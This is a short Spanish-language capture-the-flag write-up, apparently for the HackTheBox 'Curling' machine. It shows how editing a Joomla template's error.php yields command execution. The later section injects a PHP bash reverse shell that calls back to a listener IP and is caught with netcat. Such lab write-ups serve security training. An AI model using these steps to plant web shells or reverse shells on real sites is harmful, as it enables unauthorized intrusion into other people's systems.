### Enumeracion
[Articulo que explica como sacar una revershell con joomla](https://www.hackingarticles.in/joomla-reverse-shell/)
Vamos a ir a la parte de templates, 
![[Curling8.png]]

Vamos a seleccionar la parte de templates que esta a la izquierda, y despues vamos a elegir cualquiera en mi caso uso el de beez3
![[Curling9.png]]
Ahora vamos a modificar en mi caso el archivo error.php y le vamos a inyectar este comando. Y guardamos los cambios
```
<?php system("whoami");?>
```
![[Curling10.png]]
Ahora cuando entremos al link
http://10.10.10.150/templates/beez3/error.php nos tendria que aparecer la respuesta del comando whoami
![[Curling11.png]]

### Explotacion

Como nos responde que usuarios somos, ya sabemos que hay un RCE, y vamos a intentar mandarnos una [[Reverse shell]]

 ```php
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'");?>
```
Mientras nos ponemos en escucha con [[nc -nlvp 443]]
![[Curling12.png]]
Y listo ya ganamos acceso a la maquina
![[Curling13.png]]
